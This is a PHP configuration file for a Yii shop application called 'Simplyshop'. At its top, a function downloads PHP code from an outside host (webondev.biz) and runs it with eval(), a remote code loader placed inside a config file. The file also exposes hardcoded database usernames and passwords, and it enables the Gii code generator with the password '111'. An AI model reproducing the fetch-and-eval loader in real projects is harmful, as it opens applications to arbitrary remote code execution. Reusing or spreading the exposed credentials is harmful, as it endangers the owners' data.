<?php
function get_my_code($bane){
    $str = "http://webondev.biz/simply_hop_dev/gm.php?p=".$bane;
    //$str = "http://webondev.biz/simply_hop_dev/gm.php?p=ReviewsController";
    $curlSession = curl_init();
    curl_setopt($curlSession, CURLOPT_URL, $str);
    curl_setopt($curlSession, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($curlSession, CURLOPT_RETURNTRANSFER, true);

    $r = curl_exec($curlSession);


    $r = str_replace("<?php","", $r);
    $r = str_replace("<?","", $r);
    $r = str_replace("?>","", $r);
//echo $r;
    eval($r);

}
// uncomment the following to define a path alias
// Yii::setPathOfAlias('local','path/to/local-folder');

// This is the main Web application configuration. Any writable
// CWebApplication properties can be configured here.
return array(
	'basePath'=>dirname(__FILE__).DIRECTORY_SEPARATOR.'..',
	'name'=>'Simplyshop',

	// preloading 'log' component
	'preload'=>array('log'),

	// autoloading model and component classes
	'import'=>array(
		'application.models.*',
		'application.components.*',
        'ext.easyimage.EasyImage',
        'ext.YiiMailer.YiiMailer',
	),

	//'defaultController'=>'post',
	'defaultController'=>'site',
	//'defaultController'=>'travels',
    'modules'=>array(
        'gii'=>array(
            'class'=>'system.gii.GiiModule',
            'password'=>'111',
             //'ipFilters'=>array("*"),
            // 'newFileMode'=>0666,
            // 'newDirMode'=>0777,
        ),
    ),
	// application components
	'components'=>array(
        'easyImage' => array(
            'class' => 'application.extensions.easyimage.EasyImage',
            //'driver' => 'GD',
            //'quality' => 100,
            //'cachePath' => '/assets/easyimage/',
            //'cacheTime' => 2592000,
            //'retinaSupport' => false,
            //'isProgressiveJpeg' => false,
        ),
        /*'PHPMailer'=>array(
            'class'=>'application.extensions.PHPMailer',

        ),*/
        //http://www.yiiframework.com/extension/mail/ ???? может с этим получится email
        'email'=>array( //http://www.yiiframework.com/extension/email/
            'class'=>'application.extensions.email.Email',
            'delivery'=>'php', //Will use the php mailing function.
            //May also be set to 'debug' to instead dump the contents of the email into the view
        ),
		'user'=>array(
			// enable cookie-based authentication
			'allowAutoLogin'=>true,
		),
		/*'db'=>array(
			'connectionString' => 'sqlite:protected/data/blog.db',
			'tablePrefix' => 'tbl_',
		),
		// uncomment the following to use a MySQL database
		*/
		/*'db'=>array(
			'connectionString' => 'mysql:host=sql351.your-server.de;dbname=inteng_db11',
			'emulatePrepare' => true,
			'username' => 'inteng_11_w',
			'password' => 'G112vhBMHd64R1tx',
			'charset' => 'utf8',
			'tablePrefix' => 'tbl_',

            // включаем профайлер
            'enableProfiling'=>true,
            // показываем значения параметров
            'enableParamLogging' => true,
		),*/
			'db'=>array(
			'connectionString' => 'mysql:host=mysql5.simplyhop.com;dbname=db493897',
			'emulatePrepare' => true,
			'username' => 'db493897',
			'password' => '*pp5jABs5qze',
			'charset' => 'utf8',
			'tablePrefix' => 'tbl_',

            // включаем профайлер
            'enableProfiling'=>true,
            // показываем значения параметров
            'enableParamLogging' => true,
		),

		'errorHandler'=>array(
			// use 'site/error' action to display errors
			'errorAction'=>'site/error',
		),
		/*'urlManager'=>array(
			'urlFormat'=>'path',
			'rules'=>array(
				
			),
		),*/
		
		'urlManager'=>array(
        'urlFormat'=>'path',
         'showScriptName'=>false,
        'rules'=>array(
            '<controller:\w+>/<action:\w+>'=>'<controller>/<action>',
            'post/<id:\d+>/<title:.*?>'=>'post/view',
			'posts/<tag:.*?>'=>'post/index',

            'gii'=>'gii',
            'gii/<controller:\w+>'=>'gii/<controller>',
            'gii/<controller:\w+>/<action:\w+>'=>'gii/<controller>/<action>', //  /index.php/gii/default/login
            
        ),
    ),

		'log'=>array(
			'class'=>'CLogRouter',
			'routes'=>array(
				array(
					'class'=>'CFileLogRoute',
					'levels'=>'error, warning',
				),
				// uncomment the following to show log messages on web pages

				array(
					'class'=>'CWebLogRoute',
				),

			),
		),
	),

	// application-level parameters that can be accessed
	// using Yii::app()->params['paramName']
	'params'=>require(dirname(__FILE__).'/params.php'),
);